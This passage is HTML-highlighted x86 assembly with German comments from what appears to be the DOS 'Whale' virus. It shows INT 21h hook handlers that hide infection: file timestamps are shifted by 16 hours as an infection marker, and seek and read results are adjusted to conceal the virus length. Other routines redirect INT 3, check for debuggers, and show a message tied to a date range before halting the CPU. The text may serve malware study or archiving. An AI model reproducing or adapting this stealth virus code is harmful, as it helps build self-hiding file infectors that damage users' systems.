                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">          </span><span class="sc1">; SEEK zum File-Ende</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">   </span><span class="sc1">; File-Laenge zurÅck</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">          </span><span class="sc1">; SEEK zur alten Position</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetRegsFromVirstack</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">75</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================================( INT 3 aus INT 21-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0451A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; POP IP</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">      </span><span class="sc1">; POP CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; POP Flags</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J044A9</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================( Handler fÅr Get/Set Filedatum )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0451F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; GET File-Date ??</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04550</span><span class="sc0">          </span><span class="sc1">; Nein, SET !</span><span class="sc0">
                </span><span class="sc1">;---------------------------------( get file-date )---</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">76</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FFFEH</span><span class="sc0"> </span><span class="sc1">; clear CF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">76</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J04547</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; FILE-STUNDE &gt; 16 ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04544</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; Wenn ja, 16 abziehen</span><span class="sc0">
</span><span class="sc5">J04544</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">IRET_Int21h</span><span class="sc0">     </span><span class="sc1">; INT 21 beenden</span><span class="sc0">
                </span><span class="sc1">;------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J04547</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],+</span><span class="sc2">01h</span><span class="sc1">; SET CF des Callers</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">IRET_Int21h</span><span class="sc0">
                </span><span class="sc1">;----------------------------------( set file-date )---</span><span class="sc0">
</span><span class="sc5">J04550</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; ist es 'set file date' ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J045CD</span><span class="sc0">          </span><span class="sc1">; Fehler im Walcode!</span><span class="sc0">
                                        </span><span class="sc1">; CALL LOW-INT-21</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">77</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FFFEH</span><span class="sc0"> </span><span class="sc1">; CF lîschen</span><span class="sc0">
                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; Stunde &gt; 16 ?</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">77</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0456B</span><span class="sc0">          </span><span class="sc1">; nein</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; 16 abziehen</span><span class="sc0">
</span><span class="sc5">J0456B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CheckFileTime</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04573</span><span class="sc0">          </span><span class="sc1">; kein DISK-File,</span><span class="sc0">
                                        </span><span class="sc1">; oder Stunde &lt; 16</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; sonst 16 addieren</span><span class="sc0">
                </span><span class="sc1">;-----------------</span><span class="sc0">
</span><span class="sc5">J04573</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">78</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Errorcode</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],+</span><span class="sc2">00h</span><span class="sc1">; = CLC</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">78</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( gehîrt zum INT 21-Handler )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0458D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; HOLE INT 3-Offset</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; HOLE INT 3-Segment</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Setze INT 3 auf</span><span class="sc0">
                                                </span><span class="sc1">; CS:01D0A / CS:451A</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0451A</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">                       </span><span class="sc1">; ** tricky **</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================( Handler fÅr SEEK / Handle )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J045B2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">79</span><span class="sc0">
</span><span class="sc5">J045B7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; Seek File-ENDE ??</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J045C9</span><span class="sc0">          </span><span class="sc1">; alles andere ist uninteressant</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CheckFileTime</span><span class="sc0">   </span><span class="sc1">; Ja ...</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J045C9</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">],+</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">J045C9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">79</span><span class="sc0">
</span><span class="sc5">J045CD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">          </span><span class="sc1">; CALL LOW-INT-21</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( AKTIV-MSG )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J045D0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PushALL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">                  </span><span class="sc1">; GET DATE</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc1">;==========( Nur zwischen 18.Februar und 21. MÑrz )===</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; MONAT FEBRUAR ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J045EC</span><span class="sc0">                  </span><span class="sc1">; Ja : welcher</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; MÑrz ?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J045F4</span><span class="sc0">                  </span><span class="sc1">; Ja   : welcher</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04663</span><span class="sc0">                  </span><span class="sc1">; Nein : fertig</span><span class="sc0">
</span><span class="sc5">J045EC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">                  </span><span class="sc1">; Nach dem 18. Februar ??</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J045FC</span><span class="sc0">                  </span><span class="sc1">; JA   -&gt; MSG</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04663</span><span class="sc0">                  </span><span class="sc1">; NEIN -&gt; fertig</span><span class="sc0">

</span><span class="sc5">J045F4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">                  </span><span class="sc1">; VOR 21. MÑrz ??</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J045FC</span><span class="sc0">                  </span><span class="sc1">; JA   : MSG</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04663</span><span class="sc0">                  </span><span class="sc1">; NEIN : Fertig</span><span class="sc0">
</span><span class="sc5">J045FC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0463D</span><span class="sc0">
        </span><span class="sc1">;========================================================</span><span class="sc0">
</span><span class="sc5">D45FF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"THE WHALE IN SEARCH OF THE 8 FISH"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"I AM '~knzyvo}' IN HAMBURG$"</span><span class="sc0">
        </span><span class="sc1">;========================================================</span><span class="sc0">
</span><span class="sc5">J0463D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">D45FF</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0"> </span><span class="sc1">; 1DFF</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc1">;==================================( schreibe HLT )===</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">],</span><span class="sc2">0F4F4h</span><span class="sc0">       </span><span class="sc1">; = HLT</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">D2598</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Debugger_Check</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J04663</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=================================( Handler fÅr READ FILE /Handle )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0466B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02B8B</span><span class="sc0">                  </span><span class="sc1">; CALL LOW-INT-21</span><span class="sc0">
</span><span class="sc5">J0466E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B3</span><span class="sc4">],</span><span class="sc2">0FEh</span><span class="sc1">; CF lîschen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CheckFileTime</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0466B</span><span class="sc0">                  </span><span class="sc1">; entweder kein DISK-File,</span><span class="sc0">
                                                </span><span class="sc1">; oder 'falsche' Uhrzeit</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">81</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AD</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Buffer merken</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AF</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Anzahl merken</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24B1</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Code_len</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">81</span><span class="sc0">
                </span><span class="sc6">JNS</span><span class="sc0">     </span><span class="sc5">J046B9</span><span class="sc0">                  </span><span class="sc1">; Lang genug fÅr den Wal</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J031E7</span><span class="sc0">                  </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J046B9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">82</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J046C8</span><span class="sc0">                  </span><span class="sc1">; JMP if Platz</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; Mehr als Wal-LÑnge ?</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">J046C8</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24AF</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Dann eben mehr Byte lesen,</span><span class="sc0">
                                                </span><span class="sc1">; als verlangt !</span><span class="sc0">
</span><span class="sc5">J046C8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">FilePos</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; Bin ich im 1. Segment ?</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">82</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J046DF</span><span class="sc0">                  </span><span class="sc1">; nein -&gt; JMP</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">1Ch</span><span class="sc0">                 </span><span class="sc1">; wenigstens hinter</span><span class="sc0">
                                                </span><span class="sc1">; dem EXE-Header ?</span><span class="sc0">
                </span><span class="sc6">JBE</span><span class="sc0">     </span><span class="sc5">J04704</span><span class="sc0">                  </span><span class="sc1">; JMP, wenn mittendrin !</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------( lese-Schleife )----</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J046DF</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">83</span><span class="sc0">
